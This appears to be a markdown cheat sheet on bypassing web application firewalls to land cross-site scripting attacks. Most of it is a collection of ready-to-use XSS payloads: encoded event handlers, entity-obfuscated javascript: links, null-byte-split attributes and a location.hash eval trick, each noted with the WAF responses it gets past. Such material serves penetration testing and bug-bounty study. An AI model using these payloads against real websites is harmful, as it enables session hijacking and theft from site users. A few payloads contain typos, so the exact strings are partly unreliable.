# bypass WAF

https://blog.isec.pl/waf-evasion-techniques
https://labs.cognisys.group/posts/An-Intresting-XSS-Bypassing-WAF

you will need lots of [fuzz](fuzz)ing to figure out certain characters:

- if by `<ifram>` you get 403 but `<%0aifram>` --> 200 --> then on the server it's turned
  into `<iframe>`
- something like `<%0aimg>` doesn't work on the browser, but when it goes to the server and
  back, the `%0a` will be dropped.

# known WAF: search for it on twitter.

# unknown WAF

## CDN or application based: build your own payload
## JS protection

# WAF blocks in HTML tags (before JS execution)

## alert, prompt, etc are filtered

### fuzz to find a valid tag
### `<ta{FUZZ}g>`
### WAF confusion

#### example payloads

```
<img src="/" =_=" title="onerror='prompt(origin)'">
<--` <img/src=` onerror=alert(origin)> --!> // to assuem it's a comment
<!\script>confirm(origin)</script>
```

#### html encoding to bypass the WAF

- `<img src onerror=alert(1)>` // 403
  `<img src>` // 200
  `<img src> onerror=alert(1)` // 200
  so we infer it's the problem with the angle bracket

- `<img src &#x3E onerror=alert(1)>` // 200
  client --> WAF --> html decode --> rule set
  so WAF first html decode stuff, figures out the tag is closed, so it will return 200.
  but on the browser it doesn't matter what the string actually is

## parenthesis, brackets, func(), etc are filtered

`1234()` // 200
`alert()` // 403 --> () are blocked

`alert?.()` // 200
`window.valueOf=alert;winodow+1` // 200


# WAF blocks while JS execution

you already opened an HTML tag, but can't execute JS

if you got here, you could certainly have XSS

## if it's sensitive to words --> use alternative payloads:
    - break the payload: `(aler + t(origin))`
    - put the payload to the fragment
      `url#javascript:alert(1)`
      `location=location.hash.split('#')` --> `location.hash.split('#')[1]` ==
      `javascript:alert(1)`
      then if you `eval(location=location.hash.split('#'))` XSS!
    - Unicode variations
      - `\u{0061}`
      - `\u{000000061}`

# extend your payload gradually

so that you can infer what is being issued by the WAF or ..., so you'd know what to
change, fuzz or ....

# example payloads

- `<d3v/onmouseleave=[origin].some(confirm)>click`
- `<input type="&#&#x3e"/onfocus="alert(origin)"/autofocus>`
- `<img src=\u003e onerror=alert(origin)>`
- `<details/open=/Open/href=/data=; ontoggle=" (alert)(document.domain)"`
- `<a href=&#01javascript:alert(origin)>`

```
<body onload="console.log('&#39;);&#x61;lert(origin);')">
<img/src/onerror="console.log(&quot;);&#x61;lert(origin);//">
<img/src/onerror="&#U006C;lert(origin);">
<iframe srcdoc="&lt;svg/onload=alert(origin)&gt;"></iframe>
<a href="&#&74;avascript&colon;alert(origin)">test</a>
<a href="&#&74;avascript&colon;alert(origin)">test</a>
<a/href=javascript&colon;alert()>click
<a href="j\u006Cavascript:\u006Cert(origin);">test</a>
<img sr%00c=x o%00nerror=((pro%00mpt(1)))
</*/script>ssss<%00x%20stc=<script>alert(origin);//+++<*/<script>+/*x*/
```

not all payloads work everywhere, for example this only works on akamai because it replaces
after rule set.
